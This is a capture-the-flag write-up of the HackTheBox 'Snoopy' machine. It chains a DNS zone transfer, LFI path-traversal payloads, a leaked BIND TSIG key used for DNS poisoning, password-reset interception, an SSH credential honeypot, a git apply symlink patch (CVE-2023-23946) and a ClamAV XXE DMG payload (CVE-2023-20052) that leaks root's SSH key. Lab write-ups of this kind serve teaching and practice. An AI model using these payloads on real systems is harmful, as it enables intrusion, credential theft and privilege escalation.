---
title: "HTB - Snoopy (Hard | Linux | Web)"
date: 2026-09-19 12:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, linux, dns, ssh, bind, lfi, ffuf, mattermost, zone-transfer, python-aiosmtpd, python, git, xxe, clamscan, clamav, dns-poisoning, ssh-honeypot, dmg, cve-2023-23946, cve-2023-20052]
description: "DNS zone transfer & LFI to hijack a Mattermost password reset, then a git symlink CVE & ClamAV XXE (CVE-2023-20052) to root"
image:
  path: /assets/img/snoopy.png
---

## **Recon**

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Service Discovery Analysis

The Nmap scan reveals three key services running on the target machine:

- **SSH (Port 22):** OpenSSH 8.9p1 on Ubuntu 22.04
- **DNS (Port 53):** ISC BIND 9.18.12 — a full DNS server running on an Ubuntu web server is highly unusual and immediately suspicious
- **HTTP (Port 80):** nginx 1.18.0 hosting the "SnoopySec" website

**OS:** Linux (Ubuntu 22.04) **Domain:** snoopy.htb

Two things stand out immediately: **ISC BIND 9.18.12 on port 53** is a full DNS server — not just a resolver — which suggests DNS zone management and the potential for zone transfer attacks. The **HTTP site on port 80** will need enumeration for subdomains and hidden functionality.

---

## **User**

### Website Enumeration - HTTP (Port 80)

Accessing `http://snoopy.htb/` reveals a corporate website for SnoopySec. Navigating through the pages uncovers several key findings:

![](/assets/img/snoopy/Pasted_image_20260919141005.png)

In the `/contact` page, a new subdomain is referenced: `mail.snoopy.htb`. The About section reveals employee email addresses including `sbrown@snoopy.htb`, `cschultz@snoopy.htb`, and others — these will be valuable later for targeted attacks.

![](/assets/img/snoopy/Pasted_image_20260919142245.png)

The main page also contains a redirect to `/download` with a file parameter: `/download?file=announcement.pdf`

![](/assets/img/snoopy/Pasted_image_20260919142418.png)


The `file` parameter in `/download?file=` is immediately suspicious as a potential Local File Inclusion (LFI) vector.

### DNS Zone Transfer

Since ISC BIND is running on port 53, we attempt a DNS zone transfer using `dig axfr`. A zone transfer (`axfr`) requests a full copy of a DNS zone from the name server — normally only allowed between authorized servers, but misconfigured servers may permit it from anyone:

```bash
dig axfr snoopy.htb @<target>
```

```
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.             86400   IN      NS      ns1.snoopy.htb.
snoopy.htb.             86400   IN      NS      ns2.snoopy.htb.
mattermost.snoopy.htb.  86400   IN      A       172.18.0.3
mm.snoopy.htb.          86400   IN      A       127.0.0.1
ns1.snoopy.htb.         86400   IN      A       10.0.50.10
ns2.snoopy.htb.         86400   IN      A       10.0.51.10
postgres.snoopy.htb.    86400   IN      A       172.18.0.2
provisions.snoopy.htb.  86400   IN      A       172.18.0.4
www.snoopy.htb.         86400   IN      A       127.0.0.1
snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
```

![](/assets/img/snoopy/Pasted_image_20260919142038.png)

The zone transfer succeeds, revealing the full internal DNS structure including `mattermost.snoopy.htb`, `mm.snoopy.htb`, `postgres.snoopy.htb`, and `provisions.snoopy.htb`. Notably, `mail.snoopy.htb` (seen on the website) is **not** in the zone — this means we could potentially add it ourselves if we obtain DNS update credentials.

Accessing `mm.snoopy.htb` reveals a Mattermost login panel:

![](/assets/img/snoopy/Pasted_image_20260919142712.png)

### Overview - Mattermost

**What is Mattermost?** Mattermost is an open-source, self-hosted team messaging platform similar to Slack. It features direct messages, channels, file sharing, and slash commands. It is commonly deployed in corporate environments as an internal communication tool.

**Why is it relevant here?** Mattermost has password reset functionality that sends emails to registered users. Since we control the DNS for `snoopy.htb`, if we can point `mail.snoopy.htb` to our machine and intercept SMTP traffic, we can capture password reset emails for known user accounts.

### Local File Inclusion (LFI) via Download Parameter

Returning to the suspicious `/download?file=` parameter, direct attempts to read common files like `/etc/passwd` fail with standard paths. We use `ffuf` to fuzz with a specialized LFI wordlist that includes path traversal sequences. The `-mc all` flag matches all HTTP status codes and `-ac` auto-calibrates to filter false positives:

```bash
ffuf -u http://snoopy.htb/download?file=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -ac
```

![](/assets/img/snoopy/Pasted_image_20260919142956.png)

A working path traversal payload is identified. We confirm it works by intercepting with Burp Suite and injecting the payload:

![](/assets/img/snoopy/Pasted_image_20260919143344.png)

![](/assets/img/snoopy/Pasted_image_20260919143411.png)

`/etc/passwd` is successfully returned, confirming LFI.

### BIND9 Key Extraction via LFI

Since BIND9 is running, we target its configuration files to extract DNS update keys. The `named.conf.local` file contains zone definitions and their update permissions. Using the path traversal payload with `....//` sequences to bypass simple filters:

```bash
....//....//....//....//....//....//....//....//....//etc/bind/named.conf.local
```

![](/assets/img/snoopy/Pasted_image_20260919144242.png)

The `allow-update` directive in the zone configuration references an `rndc-key` — this is the TSIG (Transaction Signature) key used to authenticate DNS dynamic updates. Anyone possessing this key can add, modify, or delete DNS records in the `snoopy.htb` zone.

We then read the main BIND configuration to extract the key value:

```bash
....//....//....//....//....//....//....//....//....//etc/bind/named.conf
```

![](/assets/img/snoopy/Pasted_image_20260919144402.png)

We save the extracted key to `rndc.key`:

```
key "rndc-key" { 
algorithm hmac-sha256; 
secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="; };
```

### DNS Poisoning - Adding mail.snoopy.htb

With the `rndc-key` in hand, we use `nsupdate` to add the `mail.snoopy.htb` DNS record pointing to our attacker machine. `nsupdate` is the standard tool for sending dynamic DNS update requests; the `-k` flag specifies the TSIG key file for authentication:

```bash
nsupdate -k rndc.key
> server <target>
> zone snoopy.htb
> update add mail.snoopy.htb. 60 A <attacker_ip>
> send
> quit
```

![](/assets/img/snoopy/Pasted_image_20260919144845.png)

We now control the `mail.snoopy.htb` DNS record, meaning any SMTP traffic directed to it will reach our machine.

### SMTP Honeypot - Password Reset Interception

### Overview - Mattermost Password Reset Attack

**The attack chain:** Mattermost sends password reset emails via SMTP to `mail.snoopy.htb`. Since we now control that DNS record, we can set up a fake SMTP server on our machine to receive and read those emails. This gives us password reset links for any known user account.

We start a fake SMTP server using `aiosmtpd`. This Python module creates a simple SMTP listener that prints all received emails to stdout — no mail delivery, just capture:

```bash
python -m aiosmtpd -n -l 0.0.0.0:25
```

We navigate to `mm.snoopy.htb` and request a password reset for `sbrown@snoopy.htb` — one of the email addresses discovered during web enumeration:

![](/assets/img/snoopy/Pasted_image_20260919145121.png)

When the reset is submitted, the SMTP server receives the email:

![](/assets/img/snoopy/Pasted_image_20260919150942.png)

![](/assets/img/snoopy/Pasted_image_20260919151040.png)

We extract and clean the reset link by removing URL-encoded characters:

```bash
http://mm.snoopy.htb/reset_password_complete?token=kiakxemjihzxzu3hapuyau18zszbu499zjshotep9af6zq8wi78htchpwxqnzour
```

Using the link, we successfully change sbrown's password:

![](/assets/img/snoopy/Pasted_image_20260919151452.png)

### Mattermost Shell via SSH Honeypot

Logging into Mattermost as sbrown, we discover the internal team chat. The `/` command reveals available slash commands. Most have descriptions, but one does not — `server_provision`:

![](/assets/img/snoopy/Pasted_image_20260919151645.png)

![](/assets/img/snoopy/Pasted_image_20260919151738.png)

We test the undocumented command by providing our attacker IP and port to see if it connects back:

![](/assets/img/snoopy/Pasted_image_20260919151925.png)

Setting up a Netcat listener:

```bash
nc -lnvp 2222
```

![](/assets/img/snoopy/Pasted_image_20260919152118.png)

A connection is received but immediately drops. However, immediately after, the user `cbrown` sends a message indicating they are trying to SSH into the specified server with their credentials:

![](/assets/img/snoopy/Pasted_image_20260919152142.png)

### Overview - SSH Honeypot (sshesame)

**What is sshesame?** sshesame is an SSH honeypot — a fake SSH server that accepts any connection, logs all authentication attempts including usernames and passwords, and optionally allows the attacker to interact with the "session." When a client connects and provides credentials, sshesame captures them in plaintext.

**Why use it here?** cbrown's message indicates they will attempt to SSH into our specified server. Instead of a real SSH server, we deploy sshesame so when cbrown connects, their credentials are captured in cleartext before they realize the server is fake.

We clone, build, and configure sshesame to listen on port 2222 (matching the port we provided earlier). We stop the real SSH service first to avoid conflicts:

```bash
git clone https://github.com/jaksi/sshesame
cd sshesame
sudo go build
sed -i 's/127.0.0.1:2022/0.0.0.0:2222/g' sshesame.yaml
systemctl stop ssh
./sshesame -config sshesame.yaml
```

We trigger the `server_provision` command again with our attacker IP. When cbrown's automated process attempts to SSH to our machine, sshesame captures their credentials:

![](/assets/img/snoopy/Pasted_image_20260919153055.png)

With cbrown's captured credentials, we authenticate via SSH:

```bash
ssh cbrown@snoopy.htb
```

Running `id` reveals cbrown is part of the **devops** group, and sbrown is also a member of that group:

![](/assets/img/snoopy/Pasted_image_20260919153354.png)

### Lateral Movement - git apply Symlink Attack (CVE-2023-23946)

Checking sudo privileges for cbrown:

```bash
sudo -l
```

![](/assets/img/snoopy/Pasted_image_20260919153419.png)

cbrown can run `/usr/bin/git apply` as sbrown. Researching this reveals **CVE-2023-23946** — a vulnerability in `git apply` versions prior to 2.39.2 that allows arbitrary file writes via a crafted patch containing symlinks. Checking the git version:

![](/assets/img/snoopy/Pasted_image_20260919153444.png)

The target runs git 2.34.1, which is vulnerable. The attack works by: creating a symlink to sbrown's `.ssh` folder, committing it to a repo, then crafting a patch that renames the symlink and uses it to write an attacker-controlled `authorized_keys` file into sbrown's SSH directory.

**Step 1:** Create a git repository in `/dev/shm` with devops group ownership, and create a symlink to sbrown's `.ssh` folder:

```bash
cd /dev/shm; mkdir rce; chown :devops rce; cd rce; git init .
ln -s /home/sbrown/.ssh symlink
git add symlink
git commit -m "add symlink"
```

**Step 2:** Create a malicious patch file that renames the symlink and writes our SSH public key into sbrown's `authorized_keys`:

```bash
# Step 1 (Attacker Machine)
ssh-keygen -t rsa -b 4096 -f ./id_rsa

# Step 2 (Victim Machine)
cat >patch <<-EOF
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDR5D2+V8Zg9ARYzYxZBusMVNgMzkOZbHJ2m6yTN24gzywkBo+0WKWSK44PDGaRs2lWVubHWDVtpnWCWACJDbOZ/bCFYiGviYrV3qyStI0ixnSWIix4H1g9kg5Yv3XMQEewYFMwmKcTNWzY6CnAYTLUU3nCW6PGKVltmBr7qLPlujjpn03w5r/k8als9tk51Lc/8PHFRdFL14HsN6zCYKSPeVgdQqs5wekNOiyJYvNKtE/Z44iJUXncBRyiswan/ZX4vdSF/gDT95cz3PN/k3MVy+IwjIbKjnMuUWGMxTd79jNQCeRyqB/HjCqjXilJG8HJpa4y+LSMNUOQ8pse5JAS0ggLS2yiUzxExTQ4aOVoIrKHWaOg3MY4bjp4HL7hR3IAjqQNulFqXmVTS+EmDfFd4m5NFU6fF2rgWJeRiVLEcg40ZFX0tbpMU0FqoW876yvKh2qQLSFZwno+C7q3JekgU00fX2XeCQquKhtKUhTknBWp8WvWViPc/lrqIlYPoEPJS5ZuRSAxHt7CXRbeW3voFaLjpwJInJnVqV3Q6V8bGkIBb5+PQtIFmFW6Dpil2J+KMb0r49pVOYBzWRXFiNHZDpAAUh/fCMFaR7XUzvuQkMIpW1dJX1BcOZXmLqkOyD/hkeCKAqahMrwkAYLVcFdmwE0l2S9sWZDQDh5s+di9Pw== kali@linux
EOF
```

**Step 3:** Apply the patch as sbrown using sudo. The `-v` flag enables verbose output to confirm successful application:

```bash
sudo -u sbrown /usr/bin/git apply -v patch
```

![](/assets/img/snoopy/Pasted_image_20260919154114.png)

The patch is applied successfully, meaning our public key is now written to `/home/sbrown/.ssh/authorized_keys`.

**Step 4:** SSH into the target as sbrown using the corresponding private key:

```bash
ssh -i id_rsa sbrown@snoopy.htb
```

![](/assets/img/snoopy/Pasted_image_20260919154211.png)

A shell is established as sbrown. The user flag can now be retrieved.

---

## **Root**

### Sudo Privilege Enumeration

Checking sbrown's sudo privileges:

```bash
sudo -l
```

![](/assets/img/snoopy/Pasted_image_20260919154320.png)

sbrown can run `/usr/local/bin/clamscan` as root. ClamAV is an antivirus scanner — running it as root to scan files is a common but dangerous configuration.

### Overview - CVE-2023-20052 (ClamAV XXE via DMG Parser)

**What is ClamAV?** ClamAV is an open-source antivirus engine commonly used on Linux systems to scan files for malware. It supports scanning many file formats including DMG (Apple Disk Image) files.

**What is CVE-2023-20052?** This is an XML External Entity (XXE) injection vulnerability in ClamAV's DMG file parser. DMG files contain an embedded Property List (XML format) that ClamAV parses using libxml2. In vulnerable versions (≤1.0.0, ≤0.105.1, ≤0.103.7), libxml2 is called with the `XML_PARSE_NOENT` flag enabled, which allows external entity substitution. An attacker can craft a DMG file containing an XXE payload in the Property List that references a local file — when ClamAV scans the file with `--debug`, it outputs the file content in its debug logs.

**The impact here:** Since clamscan runs as root, it can read any file on the system — including `/root/.ssh/id_rsa`. By crafting a malicious DMG with an XXE payload targeting the root SSH key and scanning it with `sudo clamscan --debug`, the key content is leaked in the debug output.

### Exploiting CVE-2023-20052

#### Step 1: Set Up the Exploit Environment

Clone the CVE-2023-20052 PoC repository and build the Docker container used to craft the malicious DMG:

```bash
git clone https://github.com/nokn0wthing/CVE-2023-20052.git
cd CVE-2023-20052
sudo docker build -t cve-2023-20052 .
```

#### Step 2: Generate the Malicious DMG

Run the Docker container with a volume mount to access the output. Inside the container, `genisoimage` creates a raw disk image and `dmg` converts it to the DMG format. The `bbe` (binary block editor) command then injects the XXE payload into the DMG's Property List, replacing the DOCTYPE declaration with our malicious entity that references `/root/.ssh/id_rsa`, and inserting the entity reference into the XML body:

```bash
docker run -v $(pwd):/exploit -it cve-2023-20052 bash

genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg

bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
```

![](/assets/img/snoopy/Pasted_image_20260919155853.png)

#### Step 3: Transfer the Exploit to the Target

Host the malicious DMG on a Python HTTP server and download it on the victim machine:

```bash
# Attacker Machine
python3 -m http.server 8081

# Victim Machine
wget <attacker_ip>:8081/exploit.dmg
```

#### Step 4: Trigger the XXE via ClamAV

Move the malicious DMG to sbrown's scanfiles directory and scan it as root with `--debug`. The `--debug` flag is critical — it causes ClamAV to output the resolved XML entities (containing the file content) in its debug logs:

```bash
sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
```

![](/assets/img/snoopy/Pasted_image_20260919160229.png)

The debug output contains the contents of `/root/.ssh/id_rsa`. We copy the leaked private key:

```bash
cat > id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
[...snip...]
-----END OPENSSH PRIVATE KEY-----
EOF
```

#### Step 5: SSH as Root

Set correct permissions on the extracted key and connect as root:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@snoopy.htb
```

![](/assets/img/snoopy/Pasted_image_20260919160609.png)

Full root access is achieved. The root flag can now be retrieved.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified ISC BIND 9.18.12 on port 53 alongside SSH and nginx — a DNS server on a web host is unusual and immediately targeted
2. **Web Enumeration:** Discovered employee email addresses, `mail.snoopy.htb` subdomain reference, and vulnerable `/download?file=` parameter
3. **DNS Zone Transfer:** Performed AXFR zone transfer revealing full internal DNS structure including `mm.snoopy.htb` (Mattermost) and absence of `mail.snoopy.htb`
4. **LFI Discovery:** Used ffuf with LFI wordlist to identify working path traversal payload in `/download?file=` parameter
5. **BIND9 Key Extraction:** Used LFI to read `/etc/bind/named.conf.local` and `/etc/bind/named.conf`, extracting the TSIG `rndc-key` for DNS dynamic updates
6. **DNS Poisoning:** Used `nsupdate` with the extracted key to add `mail.snoopy.htb` pointing to attacker IP
7. **SMTP Interception:** Deployed `aiosmtpd` fake SMTP server to capture Mattermost password reset email for `sbrown@snoopy.htb`
8. **Mattermost Access:** Used captured reset token to change sbrown's password and log into Mattermost
9. **SSH Honeypot:** Triggered undocumented `server_provision` slash command, deployed `sshesame` SSH honeypot to capture cbrown's credentials when they connected back
10. **cbrown Shell:** SSH'd into target as cbrown using honeypot-captured credentials
11. **git apply LFI (CVE-2023-23946):** Exploited sudo `git apply` as sbrown to write attacker SSH public key into sbrown's `authorized_keys` via symlink patch attack
12. **sbrown Shell:** SSH'd as sbrown and retrieved user flag
13. **ClamAV XXE (CVE-2023-20052):** Crafted malicious DMG with XXE payload targeting `/root/.ssh/id_rsa`, scanned it as root via sudo clamscan --debug to leak the private key
14. **Root Access:** Used leaked root SSH private key to authenticate as root and retrieved root flag